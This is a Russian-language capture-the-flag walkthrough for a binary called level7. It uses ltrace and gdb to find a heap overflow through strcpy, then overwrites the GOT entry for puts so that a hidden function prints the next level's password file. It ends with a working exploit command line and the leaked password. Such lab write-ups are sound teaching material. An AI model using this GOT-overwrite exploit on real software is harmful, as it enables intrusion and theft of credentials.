На этот раз исполняющий файл ждет две переменные:

ltrace ./level7 aaaaaaaaaaaaaaaaaaaaaa
__libc_start_main(0x8048521, 2, 0xbffff7b4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                                      = 0x0804a008
malloc(8)                                                                                                      = 0x0804a018
malloc(8)                                                                                                      = 0x0804a028
malloc(8)                                                                                                      = 0x0804a038
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaaaa")                                                                   = 0x0804a018
strcpy(0x08006161, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

ltrace ./level7 aaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaa
__libc_start_main(0x8048521, 3, 0xbffff7a4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                                                      = 0x0804a008
malloc(8)                                                                                                      = 0x0804a018
malloc(8)                                                                                                      = 0x0804a028
malloc(8)                                                                                                      = 0x0804a038
strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaaaa")                                                                   = 0x0804a018
strcpy(0x08006161, "aaaaaaaaaaaaaaa" <unfinished ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

Дисассемблируем main:

(gdb) disass main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   %ebp
   0x08048522 <+1>:	mov    %esp,%ebp
   0x08048524 <+3>:	and    $0xfffffff0,%esp
   0x08048527 <+6>:	sub    $0x20,%esp
   0x0804852a <+9>:	movl   $0x8,(%esp)               
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>    Вызов malloc размером 8
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)
   0x08048544 <+35>:	movl   $0x8,(%esp)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>    Вызов malloc размером 8
   0x08048550 <+47>:	mov    %eax,%edx
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax)
   0x08048559 <+56>:	movl   $0x8,(%esp)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>    Вызов malloc размером 8
   0x08048565 <+68>:	mov    %eax,0x18(%esp)
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax)
   0x08048573 <+82>:	movl   $0x8,(%esp)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>    Вызов malloc размером 8
   0x0804857f <+94>:	mov    %eax,%edx
   0x08048581 <+96>:	mov    0x18(%esp),%eax
   0x08048585 <+100>:	mov    %edx,0x4(%eax)
   0x08048588 <+103>:	mov    0xc(%ebp),%eax
   0x0804858b <+106>:	add    $0x4,%eax
   0x0804858e <+109>:	mov    (%eax),%eax
   0x08048590 <+111>:	mov    %eax,%edx
   0x08048592 <+113>:	mov    0x1c(%esp),%eax
   0x08048596 <+117>:	mov    0x4(%eax),%eax
   0x08048599 <+120>:	mov    %edx,0x4(%esp)
   0x0804859d <+124>:	mov    %eax,(%esp)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>    Функция strcpy() копирует строку, на которую указывает src, в массив, на который указывает dest.
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax
   0x080485a8 <+135>:	add    $0x8,%eax
   0x080485ab <+138>:	mov    (%eax),%eax
   0x080485ad <+140>:	mov    %eax,%edx
   0x080485af <+142>:	mov    0x18(%esp),%eax
   0x080485b3 <+146>:	mov    0x4(%eax),%eax
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)
   0x080485ba <+153>:	mov    %eax,(%esp)
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>     Функция strcpy() копирует строку, на которую указывает src, в массив, на который указывает dest.
   0x080485c2 <+161>:	mov    $0x80486e9,%edx
   0x080485c7 <+166>:	mov    $0x80486eb,%eax
   0x080485cc <+171>:	mov    %edx,0x4(%esp)
   0x080485d0 <+175>:	mov    %eax,(%esp)
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>       Функция fopen открывает файл с именем path и связывает его с потоком. 
   0x080485d8 <+183>:	mov    %eax,0x8(%esp)
   0x080485dc <+187>:	movl   $0x44,0x4(%esp)
   0x080485e4 <+195>:	movl   $0x8049960,(%esp)            Функция c
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>        считывает очередной символ из потока stream и возвращает преобразованный unsigned char в int или возвращает константу EOF по достижении конца файла или при возникновении ошибки.
   0x080485f0 <+207>:	movl   $0x8048703,(%esp)
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>         записывает строку s и завершающий перевод строки в stdout.
   0x080485fc <+219>:	mov    $0x0,%eax
   0x08048601 <+224>:	leave
   0x08048602 <+225>:	ret

Так же мы можем посмотреть какие еще функции в этом файле:
info functions:
0x080484f4  m
0x08048521  main

Дисассемблируем функцию m:
(gdb) disass m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x0,(%esp)
   0x08048501 <+13>:	call   0x80483d0 <time@plt>       Эта функция принимает один параметр секунда. Этот параметр используется для установки объекта time_t, в котором хранится время.
   0x08048506 <+18>:	mov    $0x80486e0,%edx
   0x0804850b <+23>:	mov    %eax,0x8(%esp)
   0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)        Функция c
   0x08048517 <+35>:	mov    %edx,(%esp)
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>    
   0x0804851f <+43>:	leave
   0x08048520 <+44>:	ret

(gdb) disass 0x8049960
Dump of assembler code for function c:
      0x08049960 <+0>:	add    %al,(%eax)          40 раз вызов add    %al,(%eax)
End of assembler dump.

objdump -d -j.rodata ./level7
080486dc <_IO_stdin_used>:
 80486dc:	01 00 02 00 25 73 20 2d 20 25 64 0a 00 72 00 2f     ....%s - %d..r./
 80486ec:	68 6f 6d 65 2f 75 73 65 72 2f 6c 65 76 65 6c 38     home/user/level8
 80486fc:	2f 2e 70 61 73 73 00 7e 7e 00                       /.pass.~~.

Строки "/home/user/level8/.pass" и "r" относятся к функции fopen(const char *path, const char *mode).
Где "/home/user/level8/.pass" это путь к афйлу и "r" это открыть текстовый файл для чтения.

Делаем вывод: нам нужно вызвать функцию 0x080484f4 m, когда мы можем это сделать. Нам нужно будет вызвать функцию m уже
после того как отработают функции fopen и fgets. Можем как на 5 уровне найти вызов функции puts в GOT и заменить на вызов функции m.

disass 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928       Вызов функции puts в GOT

Далее нам надо узнать насколько переполнить strcpy с помощью gdb, узначи что на 20 символов:

> ./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1608744106


 